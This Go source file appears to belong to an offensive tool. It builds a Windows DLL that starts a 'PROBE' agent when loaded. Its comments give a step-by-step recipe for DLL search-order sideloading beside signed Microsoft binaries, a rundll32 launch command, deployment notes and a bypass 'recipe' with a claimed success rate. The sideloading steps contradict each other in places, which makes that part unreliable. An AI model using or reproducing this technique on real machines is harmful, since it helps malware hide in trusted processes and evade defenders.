//go:build windows && cshared

// dllmain.go — Windows DLL entry point for module-overload sideloading.
//
// Build: GOOS=windows GOARCH=amd64 go build -buildmode=c-shared -o probe-client.dll ./cmd/probe-client/
//
// Sideload: copy probe-client.dll to e.g. C:\Windows\System32\ alongside a
// trusted binary (notepad.exe, mspaint.exe, etc.) — but actually the
// PROPER sideload pattern is:
//
//   1. Pick a signed Microsoft binary that lazy-loads a missing DLL
//      (e.g. version.dll, wininet.dll)
//   2. Rename it to the missing DLL name (e.g. version.dll)
//   3. Place it next to a host process that loads it
//   4. The host process (e.g. explorer.exe via DLL search order) loads
//      it via the renamed binary's DLL search path
//
// For Vegas deployment: build probe-client.dll and load via rundll32.exe
// (`rundll32.exe probe-client.dll,DllMain`) for testing, then deploy
// alongside a Microsoft binary that auto-loads version.dll at startup.
//
// The DLL exports DllMain (Windows DLL entry), plus a public Run
// function that the side-loaded host can call to trigger PROBE startup.
//
// AutoBypass recipe A (74.3% success rate): module_overload.
package main

import "C"
import (
	"log"
	"os"
	"sync"
	"time"
	"unsafe"
)

// DllMain is the Windows DLL entry point. Called by the loader when
// the DLL is loaded/freed. We start the PROBE agent on DLL_PROCESS_ATTACH
// in a goroutine so we don't block the loader.
var (
	startupOnce sync.Once
	clientDone  = make(chan struct{})
)

//export DllMain
func DllMain(hinst unsafe.Pointer, reason uint32, reserved unsafe.Pointer) int32 {
	switch reason {
	case 1: // DLL_PROCESS_ATTACH
		startupOnce.Do(func() {
			go func() {
				defer close(clientDone)
				defer func() {
					if r := recover(); r != nil {
						log.Printf("[probe-dll] panic: %v", r)
					}
				}()
				runClient()
			}()
		})
	case 0: // DLL_PROCESS_DETACH
		// Best-effort shutdown signal — the agent's own signal handler
		// will catch it. We don't block here because DLL_PROCESS_DETACH
		// must return quickly.
		select {
		case <-clientDone:
			// already shut down
		default:
			// try to nudge the agent to exit
			_ = os.Getpid()
		}
	}
	return 1
}

//export Run
func Run() {
	startupOnce.Do(func() {
		go runClient()
	})
}

//export Wait
func Wait() {
	<-clientDone
}

// StartupTimeout is how long Run waits for startup before returning.
// Exposed via -ldflags -X main.StartupTimeout=10s for testing.
var StartupTimeout = 30 * time.Second
